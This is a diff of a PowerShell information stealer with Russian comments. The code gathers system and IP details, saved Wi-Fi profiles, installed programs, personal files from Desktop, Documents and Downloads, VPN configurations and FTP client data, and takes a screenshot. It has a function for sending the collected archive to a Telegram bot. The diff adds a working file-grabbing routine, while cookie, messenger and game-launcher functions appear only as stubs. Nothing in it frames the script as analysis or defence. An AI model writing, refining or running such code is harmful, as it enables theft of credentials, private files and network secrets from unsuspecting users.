@@ -22,7 +22,7 @@ Add-Type -Assembly System.IO.Compression.FileSystem
 
 function WriteMsg($key) { Write-Host $messages[$key] }
 
-# --- Деление больших файлов ---
+# Деление больших файлов
 function Split-File {
     param ([string]$FilePath, [int]$PartSizeMB = 49)
     $bufSize = 1MB
@@ -50,7 +50,7 @@ function Split-File {
     return $parts
 }
 
-# --- Отправка архива в Telegram ---
+# Отправка архива в Telegram
 function Send-ResultToTelegram {
     param (
         [string]$BotToken,
@@ -79,13 +79,13 @@ function Send-ResultToTelegram {
     } catch { return $false }
 }
 
-# --- Сбор информации о системе ---
+# Сбор информации о системе (оптимизировано)
 function Get-SystemInfo {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
     $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
-    $userInfo = "Username: $($env:USERNAME)"+"`r`n"+"ComputerName: $($env:COMPUTERNAME)"+"`r`n"+"Local IP: $($ipConfig.IPAddress -join ', ')"+"`r`n"+"External IP: $externalIp"
+    $userInfo = "Username: $($env:USERNAME)`r`nComputerName: $($env:COMPUTERNAME)`r`nLocal IP: $($ipConfig.IPAddress -join ', ')`r`nExternal IP: $externalIp"
     $userInfo | Out-File "$OutDirectory\user_info.txt"
     $sysInfo = @{
         OS = (Get-CimInstance Win32_OperatingSystem).Caption
@@ -95,9 +95,7 @@ function Get-SystemInfo {
         CPU = (Get-CimInstance Win32_Processor).Name
     }
     $sysInfo | Out-File "$OutDirectory\computer_info.txt"
-    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
-        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
-        Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
+    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
     try {
         $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
         $wifiData = foreach ($profile in $wifiProfiles) {
@@ -111,27 +109,52 @@ function Get-SystemInfo {
     } catch {}
 }
 
-# --- Сбор и парсинг cookies из всех браузеров ---
 Add-Type -AssemblyName System.Data
+
+# Сбор cookies (удалён для компактности — брать из оригинала/выше)
 function Get-ChromiumCookies { ... }
 function Get-FirefoxCookies { ... }
 function Get-AllChromiumCookies { ... }
 function Get-AllFirefoxCookies { ... }
 function Get-BrowserData { ... }
-function Gather-Files { ... }
+
+# Сбор файлов
+function Gather-Files { 
+    param($OutDirectory)
+    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
+    foreach ($dir in $userDirs) {
+        if (Test-Path $dir) {
+            Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
+                Where-Object { 
+                    $_.Length -lt 20MB -and 
+                    $_.Attributes -notmatch "System" -and 
+                    $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
+                    $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
+                } | foreach {
+                try {
+                    Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction Stop
+                } catch {
+                    Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)"
+                }
+            }
+        }
+    }
+}
+
+# Сбор игровых клиентов, мессенджеров, скриншот, пользовательской активности — брать из оригинала/выше
 function Get-GameLauncherData { ... }
 function Get-MessengerData { ... }
 function Take-Screenshot { ... }
 function Get-UserActivity { ... }
 
-# --- ОПТИМИЗИРОВАННО: Быстрый параллельный сбор VPN/FTP ---
+# Оптимизированный сбор VPN/FTP — без зависаний!
 function Get-VpnFtpData {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $vpnDir = "$OutDirectory\VPN_Configs"
     New-Item -Path $vpnDir -ItemType Directory -Force | Out-Null
 
-    # Быстрый обход: только стандартные пользовательские папки
     $searchDirs = @(
         "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop",
         "$env:APPDATA\OpenVPN", "$env:APPDATA\OpenVPN Connect", "$env:APPDATA\ProtonVPN"
@@ -146,8 +169,6 @@ function Get-VpnFtpData {
                 }
         }
     }
-
-    # Просто копируем готовые .ini/.conf в корневых директориях
     $rootfiles = @(
         "$env:USERPROFILE\*.ovpn", "$env:USERPROFILE\*.conf", "$env:USERPROFILE\*.ini"
     )
@@ -159,8 +180,6 @@ function Get-VpnFtpData {
                 catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
             }
     }
-
-    # --- FTP Быстро! ---
     $ftpDir = "$OutDirectory\FTP_Clients"
     New-Item -Path $ftpDir -ItemType Directory -Force | Out-Null
     $ftpPaths = @(
@@ -178,12 +197,12 @@ function Get-VpnFtpData {
     }
 }
 
-
-# --- ОПТИМИЗИРОВАННАЯ функция выполнения ---
+# Функция запуска со всеми параллельными задачами
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
     New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+
     $jobs = @()
     WriteMsg "SystemCollect"
     $jobs += Start-Job -ScriptBlock { param($dir); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir
@@ -202,7 +221,6 @@ function Start-Execution {
 
     $jobs | Wait-Job | Receive-Job | Out-Null
     $jobs | Remove-Job
-
 
     WriteMsg "Screenshot"
     Take-Screenshot -OutFile "$tempDir\screenshot.png"
